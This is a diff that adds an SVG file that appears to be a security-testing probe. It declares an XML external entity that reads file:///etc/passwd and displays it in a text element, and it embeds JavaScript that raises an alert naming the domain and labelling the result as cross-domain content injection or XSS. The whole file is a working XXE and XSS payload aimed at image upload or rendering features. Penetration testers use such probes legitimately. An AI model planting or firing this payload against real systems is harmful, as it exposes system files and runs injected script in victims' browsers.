@@ -1,0 +1,10 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE svg [<!ELEMENT text ANY><!ENTITY asw SYSTEM "file:///etc/passwd">]>
+<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
+   <script type="text/javascript">
+	  var msg = "";
+	  if ("www.aswsec.com"===document.domain) {msg="\r\n\r\nFinding: Cross Domain Content Injection";} else {msg="\r\n\r\nFinding: Potential XSS due to SVG content rendering";}
+      alert('JavaScript alert from the following domain: ' + document.domain + msg);
+   </script>
+   <text font-size="12" font-family="Georgia" x="10" y="10" width="900" height="900">&asw;</text>
+</svg>
